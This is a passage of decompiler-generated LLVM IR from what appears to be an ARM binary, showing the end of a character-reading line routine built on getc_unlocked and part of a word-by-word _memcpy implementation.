  %v0_18c04 = phi i32 [ %v0_18be0.pre, %dec_label_pc_18c34.backedge.dec_label_pc_18be0_crit_edge ], [ %arg3, %dec_label_pc_18c34.preheader ]
  %v1_18be0 = add i32 %v0_18c04, 16
  %v2_18be0 = inttoptr i32 %v1_18be0 to i32*
  %v3_18be0 = load i32, i32* %v2_18be0, align 4
  store i32 %v3_18be0, i32* %r2.global-to-local, align 4
  %v1_18be4 = add i32 %v0_18c04, 24
  %v2_18be4 = inttoptr i32 %v1_18be4 to i32*
  %v3_18be4 = load i32, i32* %v2_18be4, align 4
  store i32 %v3_18be4, i32* %r3.global-to-local, align 4
  %v3_18be8 = icmp uge i32 %v3_18be0, %v3_18be4
  store i1 %v3_18be8, i1* %cpsr_c.global-to-local, align 1
  %v9_18be8 = icmp eq i32 %v3_18be0, %v3_18be4
  store i1 %v9_18be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18be8, label %dec_label_pc_18c04, label %dec_label_pc_18bf0

dec_label_pc_18bf0:                               ; preds = %dec_label_pc_18be0
  %v1_18bf0 = inttoptr i32 %v3_18be0 to i8*
  %v2_18bf0 = load i8, i8* %v1_18bf0, align 1
  %v3_18bf0 = zext i8 %v2_18bf0 to i32
  store i32 %v3_18bf0, i32* %r3.global-to-local, align 4
  %v5_18bf0 = add i32 %v3_18be0, 1
  store i32 %v5_18bf0, i32* %r2.global-to-local, align 4
  %v2_18bf4 = load i32, i32* @r5, align 4
  %v3_18bf4 = inttoptr i32 %v2_18bf4 to i8*
  store i8 %v2_18bf0, i8* %v3_18bf4, align 1
  %v4_18bf4 = load i32, i32* @r5, align 4
  %v5_18bf4 = add i32 %v4_18bf4, 1
  store i32 %v5_18bf4, i32* @r5, align 4
  %v0_18bf8 = load i32, i32* %r3.global-to-local, align 4
  %v2_18bf8 = icmp ugt i32 %v0_18bf8, 9
  store i1 %v2_18bf8, i1* %cpsr_c.global-to-local, align 1
  %v7_18bf8 = icmp eq i32 %v0_18bf8, 10
  store i1 %v7_18bf8, i1* %cpsr_z.global-to-local, align 1
  %v0_18bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_18bfc = load i32, i32* @r4, align 4
  %v2_18bfc = add i32 %v1_18bfc, 16
  %v3_18bfc = inttoptr i32 %v2_18bfc to i32*
  store i32 %v0_18bfc, i32* %v3_18bfc, align 4
  br i1 %v7_18bf8, label %dec_label_pc_18c3c, label %dec_label_pc_18c34.backedge

dec_label_pc_18c04:                               ; preds = %dec_label_pc_18be0
  %v1_18c04 = inttoptr i32 %v0_18c04 to i16*
  %v3_18c08 = call i32 @getc_unlocked(i16* %v1_18c04)
  %v3_18c0c = icmp eq i32 %v3_18c08, -1
  store i1 %v3_18c0c, i1* %cpsr_c.global-to-local, align 1
  %v8_18c0c = icmp eq i32 %v3_18c08, -1
  store i1 %v8_18c0c, i1* %cpsr_z.global-to-local, align 1
  %v1_18c10 = urem i32 %v3_18c08, 256
  store i32 %v1_18c10, i32* %r3.global-to-local, align 4
  br i1 %v3_18c0c, label %dec_label_pc_18c18, label %dec_label_pc_18c30

dec_label_pc_18c18:                               ; preds = %dec_label_pc_18c04
  %v0_18c18 = load i32, i32* @r4, align 4
  %v1_18c18 = inttoptr i32 %v0_18c18 to i16*
  %v2_18c18 = load i16, i16* %v1_18c18, align 2
  %v3_18c18 = zext i16 %v2_18c18 to i32
  store i32 %v3_18c18, i32* %r3.global-to-local, align 4
  %v1_18c1c = and i32 %v3_18c18, 8
  %v2_18c1c = icmp eq i32 %v1_18c1c, 0
  store i1 %v2_18c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c1c, label %dec_label_pc_18c3c, label %dec_label_pc_18c4c

dec_label_pc_18c30:                               ; preds = %dec_label_pc_18c04
  %v1_18c28 = trunc i32 %v3_18c08 to i8
  %v2_18c28 = load i32, i32* @r5, align 4
  %v3_18c28 = inttoptr i32 %v2_18c28 to i8*
  store i8 %v1_18c28, i8* %v3_18c28, align 1
  %v4_18c28 = load i32, i32* @r5, align 4
  %v5_18c28 = add i32 %v4_18c28, 1
  store i32 %v5_18c28, i32* @r5, align 4
  %v0_18c2c = load i32, i32* %r3.global-to-local, align 4
  %v2_18c2c = icmp ugt i32 %v0_18c2c, 9
  store i1 %v2_18c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_18c2c = icmp eq i32 %v0_18c2c, 10
  store i1 %v7_18c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c2c, label %dec_label_pc_18c3c, label %dec_label_pc_18c34.backedge

dec_label_pc_18c34.backedge:                      ; preds = %dec_label_pc_18c30, %dec_label_pc_18bf0
  %v0_18c34 = load i32, i32* @r6, align 4
  %v1_18c34 = add i32 %v0_18c34, -1
  store i32 %v1_18c34, i32* @r6, align 4
  %v2_18c34 = icmp ne i32 %v0_18c34, 0
  store i1 %v2_18c34, i1* %cpsr_c.global-to-local, align 1
  %v7_18c34 = icmp eq i32 %v0_18c34, 1
  store i1 %v7_18c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c34, label %dec_label_pc_18c3c, label %dec_label_pc_18c34.backedge.dec_label_pc_18be0_crit_edge

dec_label_pc_18c34.backedge.dec_label_pc_18be0_crit_edge: ; preds = %dec_label_pc_18c34.backedge
  %v0_18be0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18be0

dec_label_pc_18c3c:                               ; preds = %dec_label_pc_18c30, %dec_label_pc_18c34.backedge, %dec_label_pc_18bf0, %dec_label_pc_18c34.preheader, %dec_label_pc_18c18
  %v0_18c3c = load i32, i32* @r5, align 4
  %v1_18c3c = load i32, i32* @r7, align 4
  %v3_18c3c = icmp uge i32 %v0_18c3c, %v1_18c3c
  store i1 %v3_18c3c, i1* %cpsr_c.global-to-local, align 1
  %v9_18c3c = icmp eq i32 %v0_18c3c, %v1_18c3c
  store i1 %v9_18c3c, i1* %cpsr_z.global-to-local, align 1
  %v2_18c40 = xor i1 %v9_18c3c, true
  %v3_18c40 = and i1 %v3_18c3c, %v2_18c40
  br i1 %v3_18c40, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_18c3c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18c44 = inttoptr i32 %v0_18c3c to i8*
  store i8 0, i8* %v7_18c44, align 1
  %v0_18c48.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_18c48.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18c3c, %bb
  %v1_18c48 = phi i1 [ %v1_18c48.pre, %bb ], [ %v9_18c3c, %dec_label_pc_18c3c ]
  %v0_18c48 = phi i1 [ %v0_18c48.pre, %bb ], [ %v3_18c3c, %dec_label_pc_18c3c ]
  %v2_18c48 = xor i1 %v1_18c48, true
  %v3_18c48 = and i1 %v0_18c48, %v2_18c48
  br i1 %v3_18c48, label %.dec_label_pc_18c50_crit_edge, label %dec_label_pc_18c4c

.dec_label_pc_18c50_crit_edge:                    ; preds = %.thread14
  %v0_18c50.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18c50

dec_label_pc_18c4c:                               ; preds = %entry, %dec_label_pc_18c18, %.thread14
  br label %dec_label_pc_18c50

dec_label_pc_18c50:                               ; preds = %.dec_label_pc_18c50_crit_edge, %dec_label_pc_18c4c
  %v0_18c50 = phi i32 [ %v0_18c50.pre, %.dec_label_pc_18c50_crit_edge ], [ 0, %dec_label_pc_18c4c ]
  store i32 %v9_18bc0, i32* @r6, align 4
  store i32 %v12_18bc0, i32* @r7, align 4
  ret i32 %v0_18c50

; uselistorder directives
  uselistorder i1 %v9_18c3c, { 1, 0, 2 }
  uselistorder i32 %v1_18c3c, { 1, 0 }
  uselistorder i32 %v0_18c3c, { 0, 2, 1 }
  uselistorder i32 %v0_18c34, { 2, 0, 1 }
  uselistorder i32 %v0_18c2c, { 1, 0 }
  uselistorder i32 %v3_18c08, { 2, 1, 0, 3 }
  uselistorder i32 %v0_18bf8, { 1, 0 }
  uselistorder i32 %v3_18be0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_18c04, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18c50, { 1, 0 }
  uselistorder label %dec_label_pc_18c4c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_18c3c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_18be0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18c60 = load i32, i32* @r1, align 4
  %v1_18c60 = load i32, i32* @r0, align 4
  %v2_18c60 = sub i32 %v0_18c60, %v1_18c60
  %v3_18c60 = icmp ult i32 %v0_18c60, %v1_18c60
  %v4_18c60 = xor i32 %v1_18c60, %v0_18c60
  %v5_18c60 = xor i32 %v2_18c60, %v0_18c60
  %v6_18c60 = and i32 %v5_18c60, %v4_18c60
  %v7_18c60 = icmp slt i32 %v6_18c60, 0
  store i1 %v7_18c60, i1* %cpsr_v.global-to-local, align 1
  %v8_18c60 = icmp slt i32 %v2_18c60, 0
  store i1 %v8_18c60, i1* %cpsr_n.global-to-local, align 1
  %v9_18c60 = icmp eq i32 %v0_18c60, %v1_18c60
  store i1 %v9_18c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18c60, label %dec_label_pc_18eb4, label %dec_label_pc_18c68

dec_label_pc_18c68:                               ; preds = %entry
  br i1 %v9_18c60, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_18c68
  %merge = phi i32 [ %v0_18c60, %dec_label_pc_18c68 ], [ %v2_18f48, %bb150 ], [ %v11_18f64, %bb153 ], [ %v7_18f64, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18c68
  %v5_18c6c = inttoptr i32 %v1_18c60 to i8*
  store i8* %v5_18c6c, i8** %stack_var_-8, align 4
  %v8_18c6c = load i32, i32* @lr, align 4
  %v0_18c70 = load i32, i32* @r2, align 4
  %v2_18c70 = add i32 %v0_18c70, -4
  store i32 %v2_18c70, i32* %r2.global-to-local, align 4
  %v4_18c70 = sub i32 3, %v0_18c70
  %v5_18c70 = and i32 %v4_18c70, %v0_18c70
  %v6_18c70 = icmp slt i32 %v5_18c70, 0
  store i1 %v6_18c70, i1* %cpsr_v.global-to-local, align 1
  %v7_18c70 = icmp slt i32 %v2_18c70, 0
  store i1 %v7_18c70, i1* %cpsr_n.global-to-local, align 1
  %v8_18c70 = icmp eq i32 %v0_18c70, 4
  store i1 %v8_18c70, i1* %cpsr_z.global-to-local, align 1
  %v5_18c74 = icmp slt i32 %v0_18c70, 4
  br i1 %v5_18c74, label %bb140, label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %bb
  %v1_18c78 = urem i32 %v1_18c60, 4
  store i32 %v1_18c78, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18c78 = icmp eq i32 %v1_18c78, 0
  store i1 %v2_18c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c78, label %dec_label_pc_18c80, label %dec_label_pc_18d2c

dec_label_pc_18c80:                               ; preds = %dec_label_pc_18c78
  %v1_18c80 = urem i32 %v0_18c60, 4
  store i32 %v1_18c80, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18c80 = icmp eq i32 %v1_18c80, 0
  store i1 %v2_18c80, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_18c60 to i2
  br i1 %v2_18c80, label %dec_label_pc_18c88, label %dec_label_pc_18d5c

dec_label_pc_18c88:                               ; preds = %dec_label_pc_18c80, %dec_label_pc_18d54
  %v0_18ca094 = phi i32 [ %v1_18c60, %dec_label_pc_18c80 ], [ %v0_18e7c77, %dec_label_pc_18d54 ]
  %v0_18c9c93 = phi i32 [ %v0_18c60, %dec_label_pc_18c80 ], [ %v0_18d54, %dec_label_pc_18d54 ]
  %v0_18c88 = phi i32 [ %v2_18c70, %dec_label_pc_18c80 ], [ %v2_18d4c, %dec_label_pc_18d54 ]
  %v1_18c88 = add i32 %v0_18c88, -8
  store i32 %v1_18c88, i32* %r2.global-to-local, align 4
  %v3_18c88 = sub i32 7, %v0_18c88
  %v4_18c88 = and i32 %v3_18c88, %v0_18c88
  %v5_18c88 = icmp slt i32 %v4_18c88, 0
  store i1 %v5_18c88, i1* %cpsr_v.global-to-local, align 1
  %v6_18c88 = icmp slt i32 %v1_18c88, 0
  store i1 %v6_18c88, i1* %cpsr_n.global-to-local, align 1
  %v7_18c88 = icmp eq i32 %v0_18c88, 8
  store i1 %v7_18c88, i1* %cpsr_z.global-to-local, align 1
  %v2_18c8c = xor i1 %v6_18c88, %v5_18c88
  br i1 %v2_18c8c, label %dec_label_pc_18cdc, label %dec_label_pc_18c90

dec_label_pc_18c90:                               ; preds = %dec_label_pc_18c88
  %v1_18c90 = add i32 %v0_18c88, -28
  store i32 %v1_18c90, i32* %r2.global-to-local, align 4
  %v3_18c90 = sub i32 27, %v0_18c88
  %v4_18c90 = and i32 %v3_18c90, %v1_18c88
  %v5_18c90 = icmp slt i32 %v4_18c90, 0
  store i1 %v5_18c90, i1* %cpsr_v.global-to-local, align 1
  %v6_18c90 = icmp slt i32 %v1_18c90, 0
  store i1 %v6_18c90, i1* %cpsr_n.global-to-local, align 1
  %v7_18c90 = icmp eq i32 %v1_18c88, 20
  store i1 %v7_18c90, i1* %cpsr_z.global-to-local, align 1
  %v2_18c94 = xor i1 %v6_18c90, %v5_18c90
  br i1 %v2_18c94, label %dec_label_pc_18cc8, label %dec_label_pc_18c98

dec_label_pc_18c98:                               ; preds = %dec_label_pc_18c90
  %v0_18c98 = load i32, i32* @r4, align 4
  store i32 %v0_18c98, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18c9c

dec_label_pc_18c9c:                               ; preds = %dec_label_pc_18c9c.dec_label_pc_18c9c_crit_edge, %dec_label_pc_18c98
  %v0_18ca0 = phi i32 [ %v12_18ca8, %dec_label_pc_18c9c.dec_label_pc_18c9c_crit_edge ], [ %v0_18ca094, %dec_label_pc_18c98 ]
  %v0_18c9c = phi i32 [ %v0_18c9c.pre, %dec_label_pc_18c9c.dec_label_pc_18c9c_crit_edge ], [ %v0_18c9c93, %dec_label_pc_18c98 ]
  %v1_18c9c = inttoptr i32 %v0_18c9c to i32*
  %v2_18c9c = load i32, i32* %v1_18c9c, align 4
  %v3_18c9c = add i32 %v0_18c9c, 4
  %v4_18c9c = inttoptr i32 %v3_18c9c to i32*
  %v5_18c9c = load i32, i32* %v4_18c9c, align 4
  store i32 %v5_18c9c, i32* %r4.global-to-local, align 4
  %v6_18c9c = add i32 %v0_18c9c, 8
  %v7_18c9c = inttoptr i32 %v6_18c9c to i32*
  %v8_18c9c = load i32, i32* %v7_18c9c, align 4
  store i32 %v8_18c9c, i32* %ip.global-to-local, align 4
  %v9_18c9c = add i32 %v0_18c9c, 12
  %v10_18c9c = inttoptr i32 %v9_18c9c to i32*
  %v11_18c9c = load i32, i32* %v10_18c9c, align 4
  store i32 %v11_18c9c, i32* %lr.global-to-local, align 4
  %v12_18c9c = add i32 %v0_18c9c, 16
  store i32 %v12_18c9c, i32* %r1.global-to-local, align 4
  %v1_18ca0 = inttoptr i32 %v0_18ca0 to i32*
  store i32 %v2_18c9c, i32* %v1_18ca0, align 4
  %v3_18ca0 = add i32 %v0_18ca0, 4
  %v4_18ca0 = inttoptr i32 %v3_18ca0 to i32*
  %v5_18ca0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18ca0, i32* %v4_18ca0, align 4
  %v6_18ca0 = add i32 %v0_18ca0, 8
  %v7_18ca0 = inttoptr i32 %v6_18ca0 to i32*
  %v8_18ca0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18ca0, i32* %v7_18ca0, align 4
  %v9_18ca0 = add i32 %v0_18ca0, 12
  %v10_18ca0 = inttoptr i32 %v9_18ca0 to i32*
  %v11_18ca0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18ca0, i32* %v10_18ca0, align 4
  %v12_18ca0 = add i32 %v0_18ca0, 16
  store i32 %v12_18ca0, i32* %r0.global-to-local, align 4
  %v0_18ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ca4 = inttoptr i32 %v0_18ca4 to i32*
  %v2_18ca4 = load i32, i32* %v1_18ca4, align 4
  store i32 %v2_18ca4, i32* @r3, align 4
  %v3_18ca4 = add i32 %v0_18ca4, 4
  %v4_18ca4 = inttoptr i32 %v3_18ca4 to i32*
  %v5_18ca4 = load i32, i32* %v4_18ca4, align 4
  store i32 %v5_18ca4, i32* %r4.global-to-local, align 4
  %v6_18ca4 = add i32 %v0_18ca4, 8
  %v7_18ca4 = inttoptr i32 %v6_18ca4 to i32*
  %v8_18ca4 = load i32, i32* %v7_18ca4, align 4
  store i32 %v8_18ca4, i32* @ip, align 4
  %v9_18ca4 = add i32 %v0_18ca4, 12
  %v10_18ca4 = inttoptr i32 %v9_18ca4 to i32*
  %v11_18ca4 = load i32, i32* %v10_18ca4, align 4
  store i32 %v11_18ca4, i32* %lr.global-to-local, align 4
  %v12_18ca4 = add i32 %v0_18ca4, 16
  store i32 %v12_18ca4, i32* @r1, align 4
  %v1_18ca8 = inttoptr i32 %v12_18ca0 to i32*
  store i32 %v2_18ca4, i32* %v1_18ca8, align 4
  %v3_18ca8 = add i32 %v0_18ca0, 20
  %v4_18ca8 = inttoptr i32 %v3_18ca8 to i32*
  %v5_18ca8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18ca8, i32* %v4_18ca8, align 4
  %v6_18ca8 = add i32 %v0_18ca0, 24
  %v7_18ca8 = inttoptr i32 %v6_18ca8 to i32*
  %v8_18ca8 = load i32, i32* @ip, align 4
  store i32 %v8_18ca8, i32* %v7_18ca8, align 4
  %v9_18ca8 = add i32 %v0_18ca0, 28
  %v10_18ca8 = inttoptr i32 %v9_18ca8 to i32*
  %v11_18ca8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18ca8, i32* %v10_18ca8, align 4
  %v12_18ca8 = add i32 %v0_18ca0, 32
  store i32 %v12_18ca8, i32* @r0, align 4
  %v0_18cac = load i32, i32* %r2.global-to-local, align 4
  %v1_18cac = add i32 %v0_18cac, -32
  store i32 %v1_18cac, i32* %r2.global-to-local, align 4
  %v3_18cac = sub i32 31, %v0_18cac
  %v4_18cac = and i32 %v3_18cac, %v0_18cac
  %v5_18cac = icmp slt i32 %v4_18cac, 0
  %v6_18cac = icmp slt i32 %v1_18cac, 0
  %v2_18cb0 = xor i1 %v6_18cac, %v5_18cac
  br i1 %v2_18cb0, label %dec_label_pc_18cb4, label %dec_label_pc_18c9c.dec_label_pc_18c9c_crit_edge

dec_label_pc_18c9c.dec_label_pc_18c9c_crit_edge:  ; preds = %dec_label_pc_18c9c
  %v0_18c9c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18c9c

dec_label_pc_18cb4:                               ; preds = %dec_label_pc_18c9c
  %v1_18cb4 = add i32 %v0_18cac, -16
  %v3_18cb4 = add i32 %v0_18cac, 2147483616
  %v4_18cb4 = and i32 %v1_18cb4, %v3_18cb4
  %v5_18cb4 = icmp slt i32 %v4_18cb4, 0
  store i1 %v5_18cb4, i1* %cpsr_v.global-to-local, align 1
  %v6_18cb4 = icmp slt i32 %v1_18cb4, 0
  store i1 %v6_18cb4, i1* %cpsr_n.global-to-local, align 1
  %v7_18cb4 = icmp eq i32 %v1_18cb4, 0
  store i1 %v7_18cb4, i1* %cpsr_z.global-to-local, align 1
  %v2_18cb8 = xor i1 %v6_18cb4, %v5_18cb4
  br i1 %v2_18cb8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_18cb4
  %v3_18cb8 = load i32, i32* @r1, align 4
  %v4_18cb8 = inttoptr i32 %v3_18cb8 to i32*
  %v5_18cb8 = load i32, i32* %v4_18cb8, align 4
  store i32 %v5_18cb8, i32* @r3, align 4
  %v6_18cb8 = add i32 %v3_18cb8, 4
  %v7_18cb8 = inttoptr i32 %v6_18cb8 to i32*
  %v8_18cb8 = load i32, i32* %v7_18cb8, align 4
  store i32 %v8_18cb8, i32* %r4.global-to-local, align 4
  %v9_18cb8 = add i32 %v3_18cb8, 8
  %v10_18cb8 = inttoptr i32 %v9_18cb8 to i32*
  %v11_18cb8 = load i32, i32* %v10_18cb8, align 4
  store i32 %v11_18cb8, i32* @ip, align 4
  %v12_18cb8 = add i32 %v3_18cb8, 12
  %v13_18cb8 = inttoptr i32 %v12_18cb8 to i32*
  %v14_18cb8 = load i32, i32* %v13_18cb8, align 4
  store i32 %v14_18cb8, i32* %lr.global-to-local, align 4
  %v15_18cb8 = add i32 %v3_18cb8, 16
  store i32 %v15_18cb8, i32* @r1, align 4
  %v4_18cbc = inttoptr i32 %v12_18ca8 to i32*
  store i32 %v5_18cb8, i32* %v4_18cbc, align 4
  %v6_18cbc = add i32 %v0_18ca0, 36
  %v7_18cbc = inttoptr i32 %v6_18cbc to i32*
  %v8_18cbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_18cbc, i32* %v7_18cbc, align 4
  %v9_18cbc = add i32 %v0_18ca0, 40
  %v10_18cbc = inttoptr i32 %v9_18cbc to i32*
  %v11_18cbc = load i32, i32* @ip, align 4
  store i32 %v11_18cbc, i32* %v10_18cbc, align 4
  %v12_18cbc = add i32 %v0_18ca0, 44
  %v13_18cbc = inttoptr i32 %v12_18cbc to i32*
  %v14_18cbc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_18cbc, i32* %v13_18cbc, align 4
  %v15_18cbc = add i32 %v0_18ca0, 48
  store i32 %v15_18cbc, i32* @r0, align 4
  %v3_18cc0 = load i32, i32* %r2.global-to-local, align 4
  %v4_18cc0 = add i32 %v3_18cc0, -16
  store i32 %v4_18cc0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18cb4, %bb136
  %v3_18cd0102111 = phi i32 [ %v15_18cbc, %bb136 ], [ %v12_18ca8, %dec_label_pc_18cb4 ]
  %v0_18cc8.pre = phi i32 [ %v4_18cc0, %bb136 ], [ %v1_18cac, %dec_label_pc_18cb4 ]
  %v2_18cc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18cc4, i32* @r4, align 4
  br label %dec_label_pc_18cc8

dec_label_pc_18cc8:                               ; preds = %dec_label_pc_18c90, %bb137
  %v3_18cd0101 = phi i32 [ %v0_18ca094, %dec_label_pc_18c90 ], [ %v3_18cd0102111, %bb137 ]
  %v0_18cc8 = phi i32 [ %v1_18c90, %dec_label_pc_18c90 ], [ %v0_18cc8.pre, %bb137 ]
  %v1_18cc8 = add i32 %v0_18cc8, 20
  store i32 %v1_18cc8, i32* %r2.global-to-local, align 4
  %v3_18cc8 = sub i32 0, %v0_18cc8
  %v4_18cc8 = and i32 %v1_18cc8, %v3_18cc8
  %v5_18cc8 = icmp slt i32 %v4_18cc8, 0
  store i1 %v5_18cc8, i1* %cpsr_v.global-to-local, align 1
  %v6_18cc8 = icmp slt i32 %v1_18cc8, 0
  store i1 %v6_18cc8, i1* %cpsr_n.global-to-local, align 1
  %v7_18cc8 = icmp eq i32 %v1_18cc8, 0
  store i1 %v7_18cc8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18ccc

dec_label_pc_18ccc:                               ; preds = %.thread115, %dec_label_pc_18cc8
  %v0_18cdc.pre157 = phi i32 [ %v0_18cdc.pre, %.thread115 ], [ %v1_18cc8, %dec_label_pc_18cc8 ]
  %v3_18cd0 = phi i32 [ %v3_18cd099116, %.thread115 ], [ %v3_18cd0101, %dec_label_pc_18cc8 ]
  %v1_18cd4 = phi i1 [ %v1_18cd8, %.thread115 ], [ %v5_18cc8, %dec_label_pc_18cc8 ]
  %v0_18cd4 = phi i1 [ %v0_18cd8, %.thread115 ], [ %v6_18cc8, %dec_label_pc_18cc8 ]
  %v2_18ccc = xor i1 %v1_18cd4, %v0_18cd4
  br i1 %v2_18ccc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_18ccc
  %v3_18ccc = load i32, i32* @r1, align 4
  %v4_18ccc = inttoptr i32 %v3_18ccc to i32*
  %v5_18ccc = load i32, i32* %v4_18ccc, align 4
  store i32 %v5_18ccc, i32* @r3, align 4
  %v6_18ccc = add i32 %v3_18ccc, 4
  %v7_18ccc = inttoptr i32 %v6_18ccc to i32*
  %v8_18ccc = load i32, i32* %v7_18ccc, align 4
  store i32 %v8_18ccc, i32* @ip, align 4
  %v9_18ccc = add i32 %v3_18ccc, 8
  %v10_18ccc = inttoptr i32 %v9_18ccc to i32*
  %v11_18ccc = load i32, i32* %v10_18ccc, align 4
  store i32 %v11_18ccc, i32* %lr.global-to-local, align 4
  %v12_18ccc = add i32 %v3_18ccc, 12
  store i32 %v12_18ccc, i32* @r1, align 4
  %v4_18cd0 = inttoptr i32 %v3_18cd0 to i32*
  store i32 %v5_18ccc, i32* %v4_18cd0, align 4
  %v6_18cd0 = add i32 %v3_18cd0, 4
  %v7_18cd0 = inttoptr i32 %v6_18cd0 to i32*
  %v8_18cd0 = load i32, i32* @ip, align 4
  store i32 %v8_18cd0, i32* %v7_18cd0, align 4
  %v9_18cd0 = add i32 %v3_18cd0, 8
  %v10_18cd0 = inttoptr i32 %v9_18cd0 to i32*
  %v11_18cd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18cd0, i32* %v10_18cd0, align 4
  %v12_18cd0 = add i32 %v3_18cd0, 12
  store i32 %v12_18cd0, i32* @r0, align 4
  %v3_18cd4 = load i32, i32* %r2.global-to-local, align 4
  %v4_18cd4 = add i32 %v3_18cd4, -12
  store i32 %v4_18cd4, i32* %r2.global-to-local, align 4
  %v6_18cd4 = sub i32 11, %v3_18cd4
  %v7_18cd4 = and i32 %v6_18cd4, %v3_18cd4
  %v8_18cd4 = icmp slt i32 %v7_18cd4, 0
  store i1 %v8_18cd4, i1* %cpsr_v.global-to-local, align 1
  %v9_18cd4 = icmp slt i32 %v4_18cd4, 0
  store i1 %v9_18cd4, i1* %cpsr_n.global-to-local, align 1
  %v10_18cd4 = icmp eq i32 %v3_18cd4, 12
  store i1 %v10_18cd4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_18ccc, %bb138
  %v0_18cdc.pre = phi i32 [ %v4_18cd4, %bb138 ], [ %v0_18cdc.pre157, %dec_label_pc_18ccc ]
  %v3_18cd099116 = phi i32 [ %v12_18cd0, %bb138 ], [ %v3_18cd0, %dec_label_pc_18ccc ]
  %v1_18cd8 = phi i1 [ %v8_18cd4, %bb138 ], [ %v1_18cd4, %dec_label_pc_18ccc ]
  %v0_18cd8 = phi i1 [ %v9_18cd4, %bb138 ], [ %v0_18cd4, %dec_label_pc_18ccc ]
  %v2_18cd8 = xor i1 %v1_18cd8, %v0_18cd8
  br i1 %v2_18cd8, label %dec_label_pc_18cdc, label %dec_label_pc_18ccc

dec_label_pc_18cdc:                               ; preds = %.thread115, %dec_label_pc_18c88
  %v4_18cec = phi i32 [ %v0_18ca094, %dec_label_pc_18c88 ], [ %v3_18cd099116, %.thread115 ]
  %v0_18cdc = phi i32 [ %v1_18c88, %dec_label_pc_18c88 ], [ %v0_18cdc.pre, %.thread115 ]
  %v1_18cdc = add i32 %v0_18cdc, 8
  store i32 %v1_18cdc, i32* %r2.global-to-local, align 4
  %v3_18cdc = sub i32 0, %v0_18cdc
  %v4_18cdc = and i32 %v1_18cdc, %v3_18cdc
  %v5_18cdc = icmp slt i32 %v4_18cdc, 0
  store i1 %v5_18cdc, i1* %cpsr_v.global-to-local, align 1
  %v6_18cdc = icmp slt i32 %v1_18cdc, 0
  store i1 %v6_18cdc, i1* %cpsr_n.global-to-local, align 1
  %v7_18cdc = icmp eq i32 %v1_18cdc, 0
  store i1 %v7_18cdc, i1* %cpsr_z.global-to-local, align 1
  %v2_18ce0 = xor i1 %v6_18cdc, %v5_18cdc
  br i1 %v2_18ce0, label %bb140, label %dec_label_pc_18ce4

dec_label_pc_18ce4:                               ; preds = %dec_label_pc_18cdc
  %v1_18ce4 = add i32 %v0_18cdc, 4
  store i32 %v1_18ce4, i32* %r2.global-to-local, align 4
  %v3_18ce4 = sub i32 -5, %v0_18cdc
  %v4_18ce4 = and i32 %v3_18ce4, %v1_18cdc
  %v5_18ce4 = icmp slt i32 %v4_18ce4, 0
  store i1 %v5_18ce4, i1* %cpsr_v.global-to-local, align 1
  %v6_18ce4 = icmp slt i32 %v1_18ce4, 0
  store i1 %v6_18ce4, i1* %cpsr_n.global-to-local, align 1
